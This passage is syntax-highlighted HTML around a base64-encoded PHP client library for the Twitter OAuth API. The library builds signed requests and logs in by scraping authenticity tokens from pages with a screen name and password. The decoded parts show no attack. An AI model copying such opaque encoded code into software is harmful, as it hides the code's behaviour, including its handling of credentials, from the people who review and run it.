class="nx">ZXJyb3JzKTokb2JqZWN0LT5lcnJvcnM9JG9iamVjdC0</span><span class="o">+</span><span class="nx">ZXJyb3JzWzBdLT5tZXNzYWdlO2Nhc2UgaXNzZXQoJG9iamVjdC0</span><span class="o">+</span><span class="nx">ZXJyb3JzKWFuZCBpc19zdHJpbmcoJG9iamVjdC0</span><span class="o">+</span><span class="nx">ZXJyb3JzKTokb2JqZWN0LT5lcnJvcj0kb2JqZWN0LT5lcnJvcnM7Y2FzZSBpc3NldCgkb2JqZWN0LT5lcnJvcik6JG9iamVjdD1uZXcgVHdpc3RFeGNlcHRpb24oJG9iamVjdC0</span><span class="o">+</span><span class="nx">ZXJyb3IsKGludCkkam9iLT5pbmZvWydjb2RlJ10sJGpvYi0</span><span class="o">+</span><span class="nx">cmVxdWVzdCk7fXJldHVybiAkb2JqZWN0O31wcml2YXRlIHN0YXRpYyBmdW5jdGlvbiBkZWNvZGVTY3JhcGluZyhzdGRDbGFzcyAkam9iLCR2YWx1ZSl7aWYoJGpvYi0</span><span class="o">+</span><span class="nx">cmVxdWVzdC0</span><span class="o">+</span><span class="nx">bWV0aG9kPT09J0dFVCcpeyRwYXR0ZXJuPSdAPGlucHV0IG5hbWU9ImF1dGhlbnRpY2l0eV90b2tlbiIgdHlwZT0iaGlkZGVuIiB2YWx1ZT0iKFteIl0rKykiIC8</span><span class="o">+</span><span class="nx">QCc7aWYoIXByZWdfbWF0Y2goJHBhdHRlcm4sJHZhbHVlLCRtYXRjaGVzKSl7cmV0dXJuIG5ldyBUd2lzdEV4Y2VwdGlvbignRmFpbGVkIHRvIGZldGNoIGF1dGhlbnRpY2l0eV90b2tlbi4nLChpbnQpJGpvYi0</span><span class="o">+</span><span class="nx">aW5mb1snY29kZSddLCRqb2ItPnJlcXVlc3QpO30kam9iLT5yZXF1ZXN0LT5jcmVkZW50aWFsLT5zZXRBdXRoZW50aWNpdHlUb2tlbigkbWF0Y2hlc1sxXSk7cmV0dXJuIChvYmplY3QpYXJyYXkoJ2F1dGhlbnRpY2l0eV90b2tlbic9PiRtYXRjaGVzWzFdKTt9ZWxzZXskcGF0dGVybj0nQG9hdXRoX3ZlcmlmaWVyPShbXiJdKyspInw8Y29kZT4oW148XSsrKTwvY29kZT5AJztpZighcHJlZ19tYXRjaCgkcGF0dGVybiwkdmFsdWUsJG1hdGNoZXMpKXtyZXR1cm4gbmV3IFR3aXN0RXhjZXB0aW9uKCdXcm9uZyBzY3JlZW5OYW1lIG9yIHBhc3N3b3JkLicsKGludCkkam9iLT5pbmZvWydjb2RlJ10sJGpvYi0</span><span class="o">+</span><span class="nx">cmVxdWVzdCk7fSRtYXRjaD1pbXBsb2RlKCcnLGFycmF5X3NsaWNlKCRtYXRjaGVzLDEpKTskam9iLT5yZXF1ZXN0LT5jcmVkZW50aWFsLT5zZXRWZXJpZmllcigkbWF0Y2gpO3JldHVybiAob2JqZWN0KWFycmF5KCdvYXV0aF92ZXJpZmllcic9PiRtYXRjaCk7fX1wcml2YXRlIGZ1bmN0aW9uIHNldFJlcXVlc3QoVHdpc3RSZXF1ZXN0ICRyZXF1ZXN0KXskam9iPXNlbGY6OmluaXRpYWxpemUoKTskam9iLT5yZXF1ZXN0PSRyZXF1ZXN0OyR0aGlzLT5qb2JzW109JGpvYjt9fWNsYXNzIFR3aXN0SXRlcmF0b3IgZXh0ZW5kcyBUd2lzdEV4ZWN1dGVyIGltcGxlbWVudHMgSXRlcmF0b3J7cHJpdmF0ZSAkcmVzcG9uc2VzPWFycmF5KCk7ZmluYWwgcHVibGljIGZ1bmN0aW9uIHJld2luZCgpeyR0aGlzLT5yZXNwb25zZXM9YXJyYXkoKTtyZXR1cm4gJHRoaXMtPnN0YXJ0KCk7fWZpbmFsIHB1YmxpYyBmdW5jdGlvbiB2YWxpZCgpe2lmKGZhbHNlIT09JHRtcD1jdXJyZW50KCR0aGlzLT5yZXNwb25zZXMpKXtyZXR1cm4gdHJ1ZTt9JHRoaXMtPnJlc3BvbnNlcz1hcnJheSgpO3doaWxlKCEkdGhpcy0</span><span class="o">+</span><span class="nx">cmVzcG9uc2VzIGFuZCAkdGhpcy0</span><span class="o">+</span><span class="nx">aXNSdW5uaW5nKCkpeyR0aGlzLT5yZXNwb25zZXM9JHRoaXMtPnJ1bigpO31yZXR1cm4gKGJvb2wpJHRoaXMtPnJlc3BvbnNlczt9ZmluYWwgcHVibGljIGZ1bmN0aW9uIGtleSgpe3JldHVybiAnJzt9ZmluYWwgcHVibGljIGZ1bmN0aW9uIGN1cnJlbnQoKXtyZXR1cm4gY3VycmVudCgkdGhpcy0</span><span class="o">+</span><span class="nx">cmVzcG9uc2VzKTt9ZmluYWwgcHVibGljIGZ1bmN0aW9uIG5leHQoKXtuZXh0KCR0aGlzLT5yZXNwb25zZXMpO3JldHVybiAkdGhpczt9fWNsYXNzIFR3aXN0T0F1dGggZXh0ZW5kcyBUd2lzdEJhc2V7cHJpdmF0ZSAkY3JlZGVudGlhbDtwcml2YXRlICRzdWJDcmVkZW50aWFscz1hcnJheSgpO2ZpbmFsIHB1YmxpYyBmdW5jdGlvbiBfX2NvbnN0cnVjdChUd2lzdENyZWRlbnRpYWwgJGNyZWRlbnRpYWwpeyR0aGlzLT5jcmVkZW50aWFsPSRjcmVkZW50aWFsO31maW5hbCBwdWJsaWMgZnVuY3Rpb24gX19nZXQoJG5hbWUpe2lmKCFwcm9wZXJ0eV9leGlzdHMoJHRoaXMsJG5hbWU9c2VsZjo6ZmlsdGVyKCRuYW1lKSkpe3Rocm93IG5ldyBPdXRPZlJhbmdlRXhjZXB0aW9uKCJJbnZhbGlkIHByb3BlcnR5IG5hbWU6IHskbmFtZX0iKTt9cmV0dXJuICR0aGlzLT4kbmFtZTt9ZmluYWwgcHVibGljIGZ1bmN0aW9uIF9faXNzZXQoJG5hbWUpe3JldHVybiBpc3NldCgkdGhpcy0</span><span class="o">+</span><span class="nx">e3NlbGY6OmZpbHRlcigkbmFtZSl9KTt9ZmluYWwgcHVibGljIGZ1bmN0aW9uIGdldCgkZW5kcG9pbnQsJHBhcmFtcz1hcnJheSgpKXtyZXR1cm4gVHdpc3RSZXF1ZXN0OjpnZXQoJGVuZHBvaW50LCRwYXJhbXMsJHRoaXMtPmF1dG9TZWxlY3QoJGVuZHBvaW50KSktPmV4ZWN1dGUoKTt9ZmluYWwgcHVibGljIGZ1bmN0aW9uIGdldEF1dG8oJGVuZHBvaW50LCRwYXJhbXM9YXJyYXkoKSl7cmV0dXJuIFR3aXN0UmVxdWVzdDo6Z2V0QXV0bygkZW5kcG9pbnQsJHBhcmFtcywkdGhpcy0</span><span class="o">+</span><span class="nx">YXV0b1NlbGVjdCgkZW5kcG9pbnQpKS0</span><span class="o">+</span><span class="nx">ZXhlY3V0ZSgpO31maW5hbCBwdWJsaWMgZnVuY3Rpb24gcG9zdCgkZW5kcG9pbnQsJHBhcmFtcz1hcnJheSgpKXtyZXR1cm4gVHdpc3RSZXF1ZXN0Ojpwb3N0KCRlbmRwb2ludCwkcGFyYW1zLCR0aGlzLT5jcmVkZW50aWFsKS0</span><span class="o">+</span><span class="nx">ZXhlY3V0ZSgpO31maW5hbCBwdWJsaWMgZnVuY3Rpb24gcG9zdEF1dG8oJGVuZHBvaW50LCRwYXJhbXM9YXJyYXkoKSl7cmV0dXJuIFR3aXN0UmVxdWVzdDo6cG9zdEF1dG8oJGVuZHBvaW50LCRwYXJhbXMsJHRoaXMtPmNyZWRlbnRpYWwpLT5leGVjdXRlKCk7fWZpbmFsIHB1YmxpYyBmdW5jdGlvbiBzZW5kKCRlbmRwb2ludCwkcGFyYW1zPWFycmF5KCkpe3JldHVybiBUd2lzdFJlcXVlc3Q6OnNlbmQoJGVuZHBvaW50LCRwYXJhbXMsJHRoaXMtPmNyZWRlbnRpYWwpLT5leGVjdXRlKCk7fWZpbmFsIHB1YmxpYyBmdW5jdGlvbiBsb2dpbigpe3JldHVybiBUd2lzdFJlcXVlc3Q6OmxvZ2luKCR0aGlzLT5jcmVkZW50aWFsKS0</span><span class="o">+</span><span class="nx">ZXhlY3V0ZSgpO31maW5hbCBwdWJsaWMgZnVuY3Rpb24gc2V0U3ViKCl7JGFyZ3M9ZnVuY19nZXRfYXJncygpOyR0aGlzLT5zdWJDcmVkZW50aWFscz1hcnJheSgpO2FycmF5X3dhbGtfcmVjdXJzaXZlKCRhcmdzLGFycmF5KCR0aGlzLCdzZXRTdWJDYWxsYmFjaycpKTt9cHJpdmF0ZSBmdW5jdGlvbiBzZXRTdWJDYWxsYmFjayhUd2lzdENyZWRlbnRpYWwgJGNyZWRlbnRpYWwpeyRoYXNoPXNwbF9vYmplY3RfaGFzaCgkY3JlZGVudGlhbCk7JG1haW5faGFzaD1zcGxfb2JqZWN0X2hhc2goJHRoaXMtPmNyZWRlbnRpYWwpO2lmKCRoYXNoPT09JG1haW5faGFzaCl7dGhyb3cgbmV3IEludmFsaWRBcmd1bWVudEV4Y2VwdGlvbignU3BlY2lmaWVkIGNyZWRlbnRpYWwgaXMgYWxyZWFkeSByZWdpc3RlcmVkIGFzIG1haW4gY3JlZGVudGlhbC4nKTt9aWYoaXNzZXQoJHRoaXMtPnN1YkNyZWRlbnRpYWxzWyRoYXNoXSkpe3Rocm93IG5ldyBJbnZhbGlkQXJndW1lbnRFeGNlcHRpb24oJ1NwZWNpZmllZCBjcmVkZW50aWFsIGlzIGFscmVhZHkgcmVnaXN0ZXJlZCBhcyBzdWIgY3JlZGVudGlhbC4nKTt9JHRoaXMtPnN1YkNyZWRlbnRpYWxzWyRoYXNoXT0kY3JlZGVudGlhbDt9cHJpdmF0ZSBmdW5jdGlvbiBhdXRvU2VsZWN0KCRlbmRwb2ludCl7JHRtcD1Ud2lzdFJlcXVlc3Q6OmdldCgkZW5kcG9pbnQpOyRlbmRwb2ludD0kdG1wLT5lbmRwb2ludDskY3JlZGVudGlhbHM9YXJyYXlfbWVyZ2UoJHRoaXMtPnN1YkNyZWRlbnRpYWxzLGFycmF5KCR0aGlzLT5jcmVkZW50aWFsKSk7Zm9yZWFjaCgkY3JlZGVudGlhbHMgYXMgJGk9PiRjcmVkZW50aWFsKXtzd2l0Y2godHJ1ZSl7Y2FzZSFpc3NldCgkY3JlZGVudGlhbC0</span><span class="o">+</span><span class="nx">aGlzdG9yeVskZW5kcG9pbnRdKTokY3JlZGVudGlhbC0</span><span class="o">+</span><span class="nx">c2V0SGlzdG9yeSgkZW5kcG9pbnQsMCk7Y2FzZSFpc3NldCgkc2VsZWN0ZWQpOmNhc2UkbWluPiRjcmVkZW50aWFsLT5oaXN0b3J5WyRlbmRwb2ludF06JHNlbGVjdGVkPSRjcmVkZW50aWFsOyRtaW49JGNyZWRlbnRpYWwtPmhpc3RvcnlbJGVuZHBvaW50XTt9fXJldHVybiAkc2VsZWN0ZWQ7fX1jbGFzcyBUd2lzdFJlcXVlc3QgZXh0ZW5kcyBUd2lzdEJhc2V7cHJpdmF0ZSAkaG9zdDtwcml2YXRlICRlbmRwb2ludDtwcml2YXRlICRtZXRob2Q7cHJpdmF0ZSAkZXh0cmFQYXJhbXM7cHJpdmF0ZSAkc3RyZWFtaW5nO3ByaXZhdGUgJG11bHRpcGFydDtwcml2YXRlICR3YWl0UmVzcG9uc2U7cHJpdmF0ZSAkdGhyb3c7cHJpdmF0ZSAkbG9naW49ZmFsc2U7cHJpdmF0ZSAkY3JlZGVudGlhbDtwcml2YXRlICRwYXJhbXM9YXJyYXkoKTtwcml2YXRlICRyZXNwb25zZTtmaW5hbCBwdWJsaWMgc3RhdGljIGZ1bmN0aW9uIGdldCgkZW5kcG9pbnQ9JycsJHBhcmFtcz1hcnJheSgpLFR3aXN0Q3JlZGVudGlhbCAkY3JlZGVudGlhbD1udWxsKXskYXJncz1nZXRfZGVmaW5lZF92YXJzKCk7JGFyZ3MrPWFycmF5KCdtZXRob2QnPT4nR0VUJywnd2FpdFJlc3BvbnNlJz0</span><span class="o">+</span><span class="nx">dHJ1ZSwndGhyb3cnPT5mYWxzZSwpO3JldHVybiBuZXcgc2VsZigkYXJncyk7fWZpbmFsIHB1YmxpYyBzdGF0aWMgZnVuY3Rpb24gZ2V0QXV0bygkZW5kcG9pbnQ9JycsJHBhcmFtcz1hcnJheSgpLFR3aXN0Q3JlZGVudGlhbCAkY3JlZGVudGlhbD1udWxsKXskYXJncz1nZXRfZGVmaW5lZF92YXJzKCk7JGFyZ3MrPWFycmF5KCdtZXRob2QnPT4nR0VUJywnd2FpdFJlc3BvbnNlJz0</span><span class="o">+</span><span class="nx">dHJ1ZSwndGhyb3cnPT50cnVlLCk7cmV0dXJuIG5ldyBzZWxmKCRhcmdzKTt9ZmluYWwgcHVibGljIHN0YXRpYyBmdW5jdGlvbiBwb3N0KCRlbmRwb2ludD0nJywkcGFyYW1zPWFycmF5KCksVHdpc3RDcmVkZW50aWFsICRjcmVkZW50aWFsPW51bGwpeyRhcmdzPWdldF9kZWZpbmVkX3ZhcnMoKTskYXJncys9YXJyYXkoJ21ldGhvZCc9PidQT1NUJywnd2FpdFJlc3BvbnNlJz0</span><span class="o">+</span><span class="nx">dHJ1ZSwndGhyb3cnPT5mYWxzZSwpO3JldHVybiBuZXcgc2VsZigkYXJncyk7fWZpbmFsIHB1YmxpYyBzdGF0aWMgZnVuY3Rpb24gcG9zdEF1dG8oJGVuZHBvaW50PScnLCRwYXJhbXM9YXJyYXkoKSxUd2lzdENyZWRlbnRpYWwgJGNyZWRlbnRpYWw9bnVsbCl7JGFyZ3M9Z2V0X2RlZmluZWRfdmFycygpOyRhcmdzKz1hcnJheSgnbWV0aG9kJz0</span><span class="o">+</span><span class="nx">J1BPU1QnLCd3YWl0UmVzcG9uc2UnPT50cnVlLCd0aHJvdyc9PnRydWUsKTtyZXR1cm4gbmV3IHNlbGYoJGFyZ3MpO31maW5hbCBwdWJsaWMgc3RhdGljIGZ1bmN0aW9uIHNlbmQoJGVuZHBvaW50PScnLCRwYXJhbXM9YXJyYXkoKSxUd2lzdENyZWRlbnRpYWwgJGNyZWRlbnRpYWw9bnVsbCl7JGFyZ3M9Z2V0X2RlZmluZWRfdmFycygpOyRhcmdzKz1hcnJheSgnbWV0aG9kJz0</span><span class="o">+</span><span class="nx">J1BPU1QnLCd3YWl0UmVzcG9uc2UnPT5mYWxzZSwndGhyb3cnPT5mYWxzZSwpO3JldHVybiBuZXcgc2VsZigkYXJncyk7fWZpbmFsIHB1YmxpYyBzdGF0aWMgZnVuY3Rpb24gbG9naW4oVHdpc3RDcmVkZW50aWFsICRjcmVkZW50aWFsKXskYXJncz1hcnJheSgnZW5kcG9pbnQnPT4nb2F1dGgvcmVxdWVzdF90b2tlbicsJ21ldGhvZCc9PidQT1NUJywncGFyYW1zJz0</span><span class="o">+</span><span class="nx">YXJyYXkoKSwnY3JlZGVudGlhbCc9PiRjcmVkZW50aWFsLCd3YWl0UmVzcG9uc2UnPT50cnVlLCd0aHJvdyc9PnRydWUsKTskc2VsZj1uZXcgc2VsZigkYXJncyk7JHNlbGYtPmxvZ2luPXRydWU7cmV0dXJuICRzZWxmO31maW5hbCBwdWJsaWMgZnVuY3Rpb24gX19nZXQoJG5hbWUpe2lmKCFwcm9wZXJ0eV9leGlzdHMoJHRoaXMsJG5hbWU9c2VsZjo6ZmlsdGVyKCRuYW1lKSkpe3Rocm93IG5ldyBPdXRPZlJhbmdlRXhjZXB0aW9uKCJJbnZhbGlkIHByb3BlcnR5IG5hbWU6IHskbmFtZX0iKTt9cmV0dXJuICR0aGlzLT4kbmFtZTt9ZmluYWwgcHVibGljIGZ1bmN0aW9uIF9faXNzZXQoJG5hbWUpe3JldHVybiBpc3NldCgkdGhpcy0</span><span class="o">+</span><span class="nx">e3NlbGY6OmZpbHRlcigkbmFtZSl9KTt9ZmluYWwgcHVibGljIGZ1bmN0aW9uIHNldFBhcmFtcygkcGFyYW1zPWFycmF5KCkpe2lmKCR0aGlzLT5sb2dpbil7dGhyb3cgbmV3IEJhZE1ldGhvZENhbGxFeGNlcHRpb24oJ1RoaXMgb2JqZWN0IGlzIGNyZWF0ZWQgYnkgVHdpc3RSZXF1ZXN0Ojpsb2dpbigpIGNhbGwuJyk7fSR0aGlzLT5wYXJhbXM9aXNfYXJyYXkoJHBhcmFtcyk</span><span class="o">/</span><span class="nx">JHBhcmFtczpzZWxmOjpwYXJzZVF1ZXJ5KHNlbGY6OmZpbHRlcigkcGFyYW1zKSk7cmV0dXJuICR0aGlzO31maW5hbCBwdWJsaWMgZnVuY3Rpb24gc2V0Q3JlZGVudGlhbChUd2lzdENyZWRlbnRpYWwgJGNyZWRlbnRpYWw9bnVsbCl7aWYoJHRoaXMtPmxvZ2luKXt0aHJvdyBuZXcgQmFkTWV0aG9kQ2FsbEV4Y2VwdGlvbignVGhpcyBvYmplY3QgaXMgY3JlYXRlZCBieSBUd2lzdFJlcXVlc3Q6OmxvZ2luKCkgY2FsbC4nKTt9JHRoaXMtPmNyZWRlbnRpYWw9JGNyZWRlbnRpYWw7cmV0dXJuICR0aGlzO31maW5hbCBwdWJsaWMgZnVuY3Rpb24gc2V0UmVzcG9uc2UoJGJvZHk9bnVsbCl7JHRoaXMtPnJlc3BvbnNlPSRib2R5O3JldHVybiAkdGhpczt9ZmluYWwgcHVibGljIGZ1bmN0aW9uIGV4ZWN1dGUoKXtmb3JlYWNoKG5ldyBUd2lzdEl0ZXJhdG9yKCR0aGlzKWFzICRyZXF1ZXN0KXtyZXR1cm4gJHJlcXVlc3QgaW5zdGFuY2VvZiBUd2lzdEV4Y2VwdGlvbj8kcmVxdWVzdDokcmVxdWVzdC0</span><span class="o">+</span><span class="nx">cmVzcG9uc2U7fX1maW5hbCBwdWJsaWMgZnVuY3Rpb24gcHJvY2VlZCgpe3N3aXRjaCh0cnVlKXtjYXNlISR0aGlzLT5sb2dpbjp0aHJvdyBuZXcgQmFkTWV0aG9kQ2FsbEV4Y2VwdGlvbignVGhpcyBvYmplY3QgaXMgbm90IGNyZWF0ZWQgYnkgVHdpc3RSZXF1ZXN0Ojpsb2dpbigpIGNhbGwuJyk7Y2FzZSR0aGlzLT5yZXNwb25zZSBpbnN0YW5jZW9mIFR3aXN0RXhjZXB0aW9uOmNhc2UkdGhpcy0</span><span class="o">+</span><span class="nx">ZW5kcG9pbnQ9PT0nL29hdXRoL2FjY2Vzc190b2tlbic6JGFyZ3M9YXJyYXkoJ21ldGhvZCc9PidQT1NUJywnZW5kcG9pbnQnPT4nL29hdXRoL3JlcXVlc3RfdG9rZW4nLCk7YnJlYWs7Y2FzZSR0aGlzLT5lbmRwb2ludD09PScvb2F1dGgvcmVxdWVzdF90b2tlbic6JGFyZ3M9YXJyYXkoJ21ldGhvZCc9PidHRVQnLCdlbmRwb2ludCc9Picvb2F1dGgvYXV0aG9yaXplJywpO2JyZWFrO2Nhc2UkdGhpcy0</span><span class="o">+</span><span class="nx">ZW5kcG9pbnQ9PT0nL29hdXRoL2F1dGhvcml6ZSdhbmQgJHRoaXMtPm1ldGhvZD09PSdHRVQnOiRhcmdzPWFycmF5KCdtZXRob2QnPT4nUE9TVCcsJ2VuZHBvaW50Jz0</span><span class="o">+</span><span class="nx">Jy9vYXV0aC9hdXRob3JpemUnLCk7YnJlYWs7Y2FzZSR0aGlzLT5lbmRwb2ludD09PScvb2F1dGgvYXV0aG9yaXplJ2FuZCAkdGhpcy0</span><span class="o">+</span><span class="nx">bWV0aG9kPT09J1BPU1QnOiRhcmdzPWFycmF5KCdtZXRob2QnPT4nUE9TVCcsJ2VuZHBvaW50Jz0</span><span class="o">+</span><span class="nx">Jy9vYXV0aC9hY2Nlc3NfdG9rZW4nLCk7YnJlYWs7ZGVmYXVsdDp0aHJvdyBuZXcgQnNkTWV0aG9kQ2FsbEV4Y2VwdGlvbignVW5leHBlY3RlZCBlbmRwb2ludC4nKTt9JGFyZ3MrPWFycmF5KCdwYXJhbXMnPT5hcnJheSgpLCdjcmVkZW50aWFsJz0</span><span class="o">+</span><span class="nx">JHRoaXMtPmNyZWRlbnRpYWwsJ3dhaXRSZXNwb25zZSc9PnRydWUsJ3Rocm93Jz0</span><span class="o">+</span><span class="nx">dHJ1ZSwpOyR0aGlzLT5fX2NvbnN0cnVjdCgkYXJncyk7cmV0dXJuICR0aGlzO31maW5hbCBwdWJsaWMgZnVuY3Rpb24gYnVpbGRIZWFkZXJzKCl7aWYoISgkdGhpcy0</span><span class="o">+</span><span class="nx">Y3JlZGVudGlhbCBpbnN0YW5jZW9mIFR3aXN0Q3JlZGVudGlhbCkpe3Rocm93IG5ldyBCYWRNZXRob2RDYWxsRXhjZXB0aW9uKCdIZWFkZXJzIGNhbm5vdCBiZSBidWlsdCB3aXRob3V0IFR3aXN0Q3JlZGVudGlhbCBpbnN0YW5jZS4nKTt9JHBhcmFtcz0kdGhpcy0</span><span class="o">+</span><span class="nx">c29sdmVQYXJhbXMoKTskY29ubmVjdGlvbj0kdGhpcy0</span><span class="o">+</span><span class="nx">c3RyZWFtaW5nPydrZWVwLWFsaXZlJzonY2xvc2UnOyR1c2VyX2FnZW50PXVybGVuY29kZSgkdGhpcy0</span><span class="o">+</span><span class="nx">Y3JlZGVudGlhbC0</span><span class="o">+</span><span class="nx">dXNlckFnZW50KTskY29udGVudD0kdGhpcy0</span><span class="o">+</span><span class="nx">YnVpbGRPQXV0aFBhcnQoJHBhcmFtcyk7aWYoJHRoaXMtPm1ldGhvZD09PSdHRVQnKXtpZignJyE9PSRxdWVyeT1zZWxmOjpidWlsZFF1ZXJ5KCRwYXJhbXMpKXskY29udGVudC49IiZ7JHF1ZXJ5fSI7fSRsaW5lcz1hcnJheSgieyR0aGlzLT5tZXRob2R9IHskdGhpcy0</span><span class="o">+</span><span class="nx">ZW5kcG9pbnR9P3skY29udGVudH0gSFRUUC8xLjEiLCJIb3N0OiB7JHRoaXMtPmhvc3R9IiwiVXNlci1BZ2VudDogeyR1c2VyX2FnZW50fSIsIkNvbm5lY3Rpb246IHskY29ubmVjdGlvbn0iLCIiLCIiLCk7fWVsc2VpZighJHRoaXMtPm11bHRpcGFydCl7aWYoJychPT0kcXVlcnk9c2VsZjo6YnVpbGRRdWVyeSgkcGFyYW1zKSl7JGNvbnRlbnQuPSImeyRxdWVyeX0iO30kbGVuZ3RoPXN0cmxlbigkY29udGVudCk7JGxpbmVzPWFycmF5KCJ7JHRoaXMtPm1ldGhvZH0geyR0aGlzLT5lbmRwb2ludH0gSFRUUC8xLjEiLCJIb3N0OiB7JHRoaXMtPmhvc3R9IiwiVXNlci1BZ2VudDogeyR1c2VyX2FnZW50fSIsIkNvbm5lY3Rpb246IHskY29ubmVjdGlvbn0iLCJDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZCIsIkNvbnRlbnQtTGVuZ3RoOiB7JGxlbmd0aH0iLCIiLCRjb250ZW50LCk7fWVsc2V7JGJvdW5kYXJ5PSctLS0tLS0tLS0tLS0tLS0tLS0tLScuc2hhMShtdF9yYW5kKCkubWljcm90aW1lKCkpOyRhdXRob3JpemF0aW9uPWltcGxvZGUoJywgJyxleHBsb2RlKCcmJywkY29udGVudCkpOyRjb250ZW50PXNlbGY6OmJ1aWxkTXVsdGlwYXJ0Q29udGVudCgkcGFyYW1zLCRib3VuZGFyeSk7JGxlbmd0aD1zdHJsZW4oJGNvbnRlbnQpOyRsaW5lcz1hcnJheSgieyR0aGlzLT5tZXRob2R9IHskdGhpcy0</span><span class="o">+</span><span class="nx">ZW5kcG9pbnR9IEhUVFAvMS4xIiwiSG9zdDogeyR0aGlzLT5ob3N0fSIsIlVzZXItQWdlbnQ6IHskdXNlcl9hZ2VudH0iLCJDb25uZWN0aW9uOiB7JGNvbm5lY3Rpb259IiwiQXV0aG9yaXphdGlvbjogT0F1dGggeyRhdXRob3JpemF0aW9ufSIsIkNvbnRlbnQtVHlwZTogbXVsdGlwYXJ0L2Zvcm0tZGF0YTsgYm91bmRhcnk9eyRib3VuZGFyeX0iLCJDb250ZW50LUxlbmd0aDogeyRsZW5ndGh9IiwiIiwkY29udGVudCwpO31pZighJHRoaXMtPnN0cmVhbWluZyl7YXJyYXlfc3BsaWNlKCRsaW5lcywzLDAsIkFjY2VwdC1FbmNvZGluZzogZGVmbGF0ZSwgZ3ppcCIpO31pZigkdGhpcy0</span><span class="o">+</span><span class="nx">Y3JlZGVudGlhbC0</span><span class="o">+</span><span class="nx">Y29va2llcyl7JGNvb2tpZT1odHRwX2J1aWxkX3F1ZXJ5KCR0aGlzLT5jcmVkZW50aWFsLT5jb29raWVzLCcnLCc7ICcpO2FycmF5X3NwbGljZSgkbGluZXMsMywwLCJDb29raWU6IHskY29va2llfSIpO31yZXR1cm4gaW1wbG9kZSgiXHJcbiIsJGxpbmVzKTt9cHJpdmF0ZSBzdGF0aWMgZnVuY3Rpb24gYnVpbGRNdWx0aXBhcnRDb250ZW50KGFycmF5ICRwYXJhbXMsJGJvdW5kYXJ5KXskbGluZXM9YXJyYXkoKTtmb3JlYWNoKCRwYXJhbXMgYXMgJGtleT0</span><span class="o">+</span><span class="nx">JHZhbHVlKXtpZigka2V5PT09J21lZGlhW10nKXskZmlsZW5hbWU9bWQ1KG10X3JhbmQoKS5taWNyb3RpbWUoKSk7JGRpc3Bvc2l0aW9uPSJmb3JtLWRhdGE7IG5hbWU9XCJ7JGtleX1cIjsgZmlsZW5hbWU9XCJ7JGZpbGVuYW1lfVwiIjt9ZWxzZXskZGlzcG9zaXRpb249ImZvcm0tZGF0YTsgbmFtZT1cInska2V5fVwiIjt9YXJyYXlfcHVzaCgkbGluZXMsIi0teyRib3VuZGFyeX0iLCJDb250ZW50LURpc3Bvc2l0aW9uOiB7JGRpc3Bvc2l0aW9ufSIsIkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24vb2N0ZXQtc3RyZWFtIiwiIiwkdmFsdWUpO30kbGluZXNbXT0iLS17JGJvdW5kYXJ5fS0tIjtyZXR1cm4gaW1wbG9kZSgiXHJcbiIsJGxpbmVzKTt9cHJpdmF0ZSBzdGF0aWMgZnVuY3Rpb24gYnVpbGRRdWVyeShhcnJheSAkcGFyYW1zLCRwYWlyPXRydWUpeyRuZXc9YXJyYXkoKTtmb3JlYWNoKCRwYXJhbXMgYXMgJGtleT0</span><span class="o">+</span><span class="nx">JHZhbHVlKXskdmFsdWU9c3RyX3JlcGxhY2UoJyU3RScsJ34nLHJhd3VybGVuY29kZSgkdmFsdWUpKTskbmV3WyRrZXldPSRwYWlyPyJ7JGtleX09eyR2YWx1ZX0iOiR2YWx1ZTt9dWtzb3J0KCRuZXcsJ3N0cm5hdGNtcCcpO3JldHVybiBpbXBsb2RlKCcmJywkbmV3KTt9cHJpdmF0ZSBzdGF0aWMgZnVuY3Rpb24gcGFyc2VRdWVyeSgkcXVlcnkpe2ZvcmVhY2goZXhwbG9kZSgnJicsJHF1ZXJ5KWFzICRwYWlyKXtsaXN0KCRrLCR2KT1leHBsb2RlKCc9JywkcGFpciwyKSthcnJheSgxPT4nJyk7JHBhcmFtc1ska109JHY7fWlmKCRwYXJhbXM9PT1hcnJheSgnJz0</span><span class="o">+</span><span class="nx">JycpKXskcGFyYW1zPWFycmF5KCk7fXJldHVybiAkcGFyYW1zO31wcml2YXRlIGZ1bmN0aW9uIF9fY29uc3RydWN0KGFycmF5ICRhcmdzKXskdGhpcy0</span><span class="o">+</span><span class="nx">cGFyYW1zPWlzX2FycmF5KCRhcmdzWydwYXJhbXMnXSk</span><span class="o">/</span><span class="nx">JGFyZ3NbJ3BhcmFtcyddOnNlbGY6OnBhcnNlUXVlcnkoc2VsZjo6ZmlsdGVyKCRhcmdzWydwYXJhbXMnXSkpOyR0aGlzLT5jcmVkZW50aWFsPSRhcmdzWydjcmVkZW50aWFsJ107JHRoaXMtPnNldEVuZHBvaW50KCRhcmdzWydlbmRwb2ludCddKTskdGhpcy0</span><span class="o">+</span><span class="nx">bWV0aG9kPSRhcmdzWydtZXRob2QnXTskdGhpcy0</span><span class="o">+</span><span class="nx">d2FpdFJlc3BvbnNlPSRhcmdzWyd3YWl0UmVzcG9uc2UnXTskdGhpcy0</span><span class="o">+</span><span class="nx">dGhyb3c9JGFyZ3NbJ3Rocm93J107fXByaXZhdGUgZnVuY3Rpb24gc2V0RW5kcG9pbnQoJGVuZHBvaW50KXtzdGF0aWMkc3RyZWFtaW5ncz1hcnJheSgnZmlsdGVyJywnc2FtcGxlJywnZmlyZWhvc2UnKTskZW5kcG9pbnQ9c2VsZjo6ZmlsdGVyKCRlbmRwb2ludCk7c3dpdGNoKHRydWUpe2Nhc2UhJHA9cGFyc2VfdXJsKCRlbmRwb2ludCk6Y2FzZSFpc3NldCgkcFsncGF0aCddKTpjYXNlISRjb3VudD1wcmVnX21hdGNoX2FsbCgnLyg</span><span class="o">/</span><span 